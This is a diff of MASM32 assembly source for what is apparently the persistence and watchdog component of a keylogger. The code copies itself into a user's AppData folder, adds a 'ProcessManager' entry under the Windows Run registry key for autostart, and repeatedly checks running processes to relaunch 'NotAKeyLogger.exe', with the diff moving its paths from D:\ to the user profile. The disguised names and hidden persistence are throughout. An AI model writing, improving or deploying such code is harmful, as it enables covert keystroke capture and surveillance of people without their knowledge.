@@ -1,24 +1,23 @@
 include D:\masm32\include\masm32rt.inc
 
 LaunchLogger PROTO
-WinMain PROTO :DWORD, :DWORD, :DWORD, :DWORD
+WinMain PROTO 
 CompareStrings PROTO :DWORD, :DWORD
 Process32Next PROTO :DWORD, :DWORD
 Process32First PROTO :DWORD, :DWORD
 
 .DATA
-fileLocation db 'D:\KeyloggerMonitor.exe', 0
+fileLocation db 'C:\Users\MSi\AppData\Local\KeyloggerMonitor.exe', 0
 processName db 'NotAKeyLogger.exe', 0
-launchableLocation db 'D:\NotAKeyLogger.exe', 0
+launchableLocation db 'C:\Users\MSi\AppData\Local\NotAKeyLogger.exe', 0
 valueName db 'ProcessManager', 0
 autoKey db 'Software\Microsoft\Windows\CurrentVersion\Run', 0
 launchedProcessInfo PROCESS_INFORMATION <>																			;struct
 
 .DATA?
 fileName dw MAX_PATH dup(?)
-hInstance dd ?
-lpszCmdLine dd ?
 hKey dd ?
+hInstance dd ?
 fileLocationBuffer db 1000 dup(?)
 exitCode dd ?
 
@@ -26,37 +25,22 @@ exitCode dd ?
 MAIN:
 
 ;***************Get EXE Location And Move To Other Directory***************
-
 						INVOKE			GetModuleFileName, hInstance, OFFSET fileLocationBuffer, MAX_PATH
 						INVOKE			MoveFile, ADDR fileLocationBuffer, ADDR fileLocation
 
 ;**************Create Registry Key For Self Startup************************
-
 						INVOKE			RegCreateKeyEx, HKEY_CURRENT_USER, ADDR autoKey, 0, 0, 0, KEY_ALL_ACCESS, 0, ADDR hKey, 0
 						INVOKE			lstrlen, ADDR fileLocation
 						INVOKE			RegSetValueEx, hKey, ADDR valueName, 0, REG_SZ, ADDR fileLocation, eax
 						mov				eax, 1
 
-						INVOKE			GetModuleHandle, NULL
-						mov				hInstance, eax				
-
-						INVOKE			GetCommandLine
-						mov				lpszCmdLine, eax
-
-						INVOKE			WinMain, hInstance, 
-											NULL,
-											lpszCmdLine,
-											SW_SHOWDEFAULT
+						INVOKE			WinMain
 
 ;*****************Stay As Background Process**************************
-
-WinMain PROC hInst:DWORD, hPrevInst:DWORD, szCmdLine:DWORD, nShowCmd:DWORD
-
-LOCAL msg:MSG
+WinMain PROC 
 LOCAL hProcessSnap:HANDLE 
 LOCAL process:PROCESSENTRY32
 
-						INVOKE			Sleep, 10000																						;small break to wait until all processes will be launched (prevents duplicates during windows startup)
 						INVOKE			CreateToolhelp32Snapshot, TH32CS_SNAPPROCESS, 0							;snapshot of all running processes
 						mov				hProcessSnap, eax
 						mov				process.dwSize, SIZEOF process
@@ -68,7 +52,6 @@ LoopOverProc:
 						cmp				eax, ERROR_SUCCESS																		;end of enumeration, nothing was found
 						je					LaunchExe																							
 						cmp				eax, ERROR_NO_MORE_FILES																;same as above, but it is unclear from 
-																																					;microsoft documentation which one to use, so using both checks
 						je					LaunchExe
 						INVOKE			CompareStrings, ADDR processName, ADDR process.szExeFile
 						test				eax, eax
@@ -85,13 +68,11 @@ MessagePump:																																;loop to keep alive
 SleepTime:				
 						INVOKE			Sleep, 10000																						;sleep to prevent perfomance overhead due to constant process checks
 						jmp				MessagePump
-
+						ret
 WinMain ENDP
 
 ;*******************Launch Main Key Logger*********************************
-
 LaunchLogger PROC
-
 LOCAL startInfo:STARTUPINFO
 
 						INVOKE			GetStartupInfo, ADDR startInfo
@@ -102,8 +83,7 @@ LOCAL startInfo:STARTUPINFO
 
 LaunchLogger ENDP
 
-;*******************Compare Strings**********************************
-
+;*******************Compare Strings***************************************
 CompareStrings PROC string1:DWORD, string2:DWORD
 
 						xor			eax, eax
@@ -120,6 +100,5 @@ Exit:
 
 CompareStrings ENDP
 
-;**********************END******************************************
-
+;**********************END**********************************************
 END MAIN
